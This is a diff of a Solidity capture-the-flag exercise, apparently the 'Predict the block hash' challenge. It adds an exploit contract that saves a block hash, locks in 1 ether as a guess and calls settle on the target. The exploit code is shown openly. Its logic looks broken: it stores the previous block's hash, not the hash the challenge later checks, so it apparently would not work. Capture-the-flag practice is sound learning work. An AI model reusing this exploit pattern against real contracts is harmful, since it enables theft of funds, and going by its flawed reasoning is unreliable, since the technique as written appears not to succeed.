@@ -8,10 +8,7 @@ contract PredictTheBlockhash {
     uint256 settlementBlockNumber;
 
     constructor() payable {
-        require(
-            msg.value == 1 ether,
-            "Requires 1 ether to create this contract"
-        );
+        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
     }
 
     function isComplete() public view returns (bool) {
@@ -29,11 +26,7 @@ contract PredictTheBlockhash {
 
     function settle() public {
         require(msg.sender == guesser, "Requires msg.sender to be guesser");
-        require(
-            block.number > settlementBlockNumber,
-            "Requires block.number to be more than settlementBlockNumber"
-        );
-
+        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");
         bytes32 answer = blockhash(settlementBlockNumber);
 
         guesser = address(0);
@@ -47,10 +40,24 @@ contract PredictTheBlockhash {
 // Write your exploit contract below
 contract ExploitContract {
     PredictTheBlockhash public predictTheBlockhash;
-
-    constructor(PredictTheBlockhash _predictTheBlockhash) {
+    bytes32 guess;
+    event BlockNumber(uint256 blockNumber);
+    constructor(PredictTheBlockhash _predictTheBlockhash) payable {
         predictTheBlockhash = _predictTheBlockhash;
     }
+    receive() external payable {}
 
     // write your exploit code below
+    function saveFutureHash() public {
+        emit BlockNumber(block.number);
+        guess = blockhash(block.number - 1);
+    }
+    function lockInGuess() public payable {
+        emit BlockNumber(block.number);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
+    }
+    function settle() public {
+        emit BlockNumber(block.number);
+        predictTheBlockhash.settle();
+    }
 }
